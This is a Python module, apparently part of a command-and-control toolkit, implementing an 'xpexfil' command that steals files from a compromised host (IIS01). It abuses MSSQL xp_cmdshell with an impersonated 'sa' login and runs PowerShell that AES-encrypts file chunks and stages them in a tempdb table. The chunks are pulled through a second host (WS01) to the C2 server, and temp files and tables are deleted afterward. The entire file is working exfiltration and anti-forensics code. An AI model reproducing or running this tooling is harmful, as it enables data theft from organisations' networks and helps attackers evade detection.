import base64
import math
import os
import time

# controlShell/xp_mssql/ -> ../../controlServer/files/
_UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "..", "..", "controlServer", "files")


class ExfilMixin:
    """Exfil files from IIS01 via MSSQL DB channel (AES-256-CBC, chunked)."""

    def cmd_xpexfil(self, shell, remote_path: str, local_name: str,
                    insert_timeout_s: int = 600, chunk_mb: int = 10):
        """Exfil a file from IIS01 to controlServer via MSSQL DB channel (AES-256-CBC, chunked)."""
        key_b64     = base64.b64encode(os.urandom(32)).decode()
        chunk_bytes = chunk_mb * 1024 * 1024
        upload_dir  = _UPLOAD_DIR

        # A — get file size
        print("[*] xpexfil: getting file size ...")
        size_out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            f"EXEC xp_cmdshell 'powershell -Command (Get-Item {self._tsql_escape(remote_path)}).Length'"
        )
        file_size = None
        for line in (size_out or "").splitlines():
            s = line.strip()
            if s.isdigit():
                file_size = int(s)
                break
        if file_size is None:
            print(f"[!] xpexfil: could not read file size — output: {size_out!r}")
            return

        num_chunks = math.ceil(file_size / chunk_bytes)
        print(f"[*] xpexfil: {file_size} bytes → {num_chunks} chunk(s) of {chunk_mb} MB each")

        for i in range(num_chunks):
            offset = i * chunk_bytes
            length = min(chunk_bytes, file_size - offset)
            chunk_local = f"C:\\Windows\\Temp\\{local_name}.chunk{i}"

            # B — INSERT chunk
            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — INSERT (offset={offset}, len={length}) ...")
            self.cmd_xpshell_psh(shell,
                self._build_exfil_insert_ps(remote_path, key_b64, offset, length),
                timeout_s=insert_timeout_s)

            # C — confirm INSERT complete
            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — confirming INSERT complete ...")
            deadline = time.time() + insert_timeout_s
            while time.time() < deadline:
                result = self._exec_q(shell,
                    "EXECUTE AS LOGIN='sa';"
                    "SELECT CASE WHEN OBJECT_ID('tempdb..exfil','U') IS NOT NULL "
                    "THEN 'exists' ELSE 'notfound' END"
                )
                if result and 'exists' in result:
                    break
                print("[*] xpexfil: INSERT still running, retrying in 15s ...")
                time.sleep(15)
            else:
                print(f"[!] xpexfil: timed out waiting for chunk {i} INSERT — aborting")
                return

            # D — extract chunk to WS01, pull to C2, delete from WS01
            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — extracting to WS01 ...")
            extract_ps = self._build_exfil_extract_ps(chunk_local, key_b64)
            shell.cmd_exec_raw(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')

            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — pulling to C2 ...")
            shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.chunk{i}")
            shell.cmd_exec_raw(f"cmd /c del /f {chunk_local}")

            # E — drop table for next chunk
            self._exec_q(shell,
                "EXECUTE AS LOGIN='sa';"
                "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
            )

        # F — assemble chunks on C2
        print(f"[*] xpexfil: assembling {num_chunks} chunk(s) on C2 ...")
        out_path = os.path.join(upload_dir, local_name)
        with open(out_path, 'wb') as out_f:
            for i in range(num_chunks):
                cp = os.path.join(upload_dir, f"{local_name}.chunk{i}")
                with open(cp, 'rb') as cf:
                    while True:
                        buf = cf.read(1 << 20)
                        if not buf:
                            break
                        out_f.write(buf)
                os.remove(cp)
        print(f"[+] xpexfil done → {out_path}")

    def _build_exfil_insert_ps(self, remote_path: str, key_b64: str,
                               offset: int = 0, length: int = None) -> str:
        """PowerShell run on IIS01: AES-encrypt file chunk + INSERT into tempdb..exfil."""
        connstr = (f"Server={self._host.replace(':', ',')};"
                   f"Database=tempdb;User ID={self._login};Password={self._password};"
                   f"TrustServerCertificate=True")
        if length is None:
            read_block = f"$raw=[IO.File]::ReadAllBytes('{remote_path}');"
        else:
            read_block = (
                f"$fs=[IO.File]::OpenRead('{remote_path}');"
                f"$fs.Seek({offset},[IO.SeekOrigin]::Begin)|Out-Null;"
                f"$buf=New-Object byte[] {length};"
                "$n=$fs.Read($buf,0,$buf.Length);"
                "$raw=New-Object byte[] $n;"
                "[Array]::Copy($buf,0,$raw,0,$n);"
                "$fs.Close();"
            )
        return (
            read_block
            + f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$kms=New-Object System.IO.MemoryStream;"
            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.GenerateIV();"
            "$enc=$a.CreateEncryptor().TransformFinalBlock($raw,0,$raw.Length);"
            "$blob=[byte[]]($a.IV)+$enc;"
            "$t2=New-Object System.Security.Cryptography.ToBase64Transform;"
            "$ms2=New-Object System.IO.MemoryStream;"
            "$cs2=New-Object System.Security.Cryptography.CryptoStream($ms2,$t2,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs2.Write($blob,0,$blob.Length);$cs2.FlushFinalBlock();"
            "$b64=[System.Text.Encoding]::ASCII.GetString($ms2.ToArray());"
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText=\"EXECUTE AS LOGIN='sa';"
            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
            "CREATE TABLE tempdb..exfil(id INT IDENTITY(1,1),chunk NVARCHAR(MAX));GRANT SELECT ON exfil TO PUBLIC;\";"
            "$cm.ExecuteNonQuery()|Out-Null;"
            "$cs=8000;$n=[Math]::Ceiling($b64.Length/$cs);"
            "for($i=0;$i -lt $n;$i++){"
            "$chunk=$b64.Substring($i*$cs,[Math]::Min($cs,$b64.Length-$i*$cs));"
            "$esc=$chunk.Replace(\"'\",\"''\");"
            "$cm2=$cn.CreateCommand();"
            "$cm2.CommandText=\"INSERT INTO tempdb..exfil(chunk) VALUES (N'$esc')\";"
            "$cm2.ExecuteNonQuery()|Out-Null"
            "};"
            "$cn.Close();"
            "Write-Output 'exfil INSERT done'"
        )

    def _build_exfil_extract_ps(self, local_path: str, key_b64: str) -> str:
        """PowerShell run on WS01: read tempdb..exfil, decode, decrypt, write file."""
        connstr = (f"Server={self._host.replace(':', ',')};"
                   f"Database=tempdb;User ID={self._login};Password={self._password};"
                   f"TrustServerCertificate=True")
        return (
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..exfil ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$blob=$ms.ToArray();"
            f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$kms=New-Object System.IO.MemoryStream;"
            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$blob[0..15];"
            "$ct=$blob[16..($blob.Length-1)];"
            "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
            f"[IO.File]::WriteAllBytes('{local_path}',$dec)"
        )
